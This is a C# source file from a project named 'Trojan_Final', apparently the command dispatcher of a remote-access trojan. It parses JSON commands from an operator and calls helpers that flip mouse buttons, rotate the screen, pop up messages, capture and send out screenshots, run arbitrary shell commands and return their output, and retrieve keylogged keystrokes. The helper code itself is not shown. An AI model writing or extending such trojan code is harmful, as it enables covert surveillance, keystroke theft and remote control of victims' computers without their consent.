using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Trojan_Final
{
    public static class CommandParse
    {
        public static string Parse(string cmds)
        {
            if (!String.IsNullOrEmpty(cmds))
            {
                HackCommands hack = JsonConvert.DeserializeObject<HackCommands>(cmds);


                if (hack.FlipMouse)
                    HackUtilities.SwapMouseButtons();
                else
                    HackUtilities.SwapMouseButtonsBack();

                HackUtilities.RotateScreen(hack.SelectedOrientation);

                if (!String.IsNullOrEmpty(hack.OsMessage))
                    HackUtilities.ShowOSMessage(hack.OsMessage);

                if (hack.GetPrintScreen)
                {
                    HackUtilities.TakeScreenCapture();
                    try
                    {
                        HackUtilities.SendScreenCapture();
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }

                if (!String.IsNullOrEmpty(hack.Command))
                    return HackUtilities.ExecuteCmd(hack.Command);


                if (hack.GetLogs)
                    HackUtilities.RetrieveKeys();

            }

            return String.Empty;

        }
    }
}
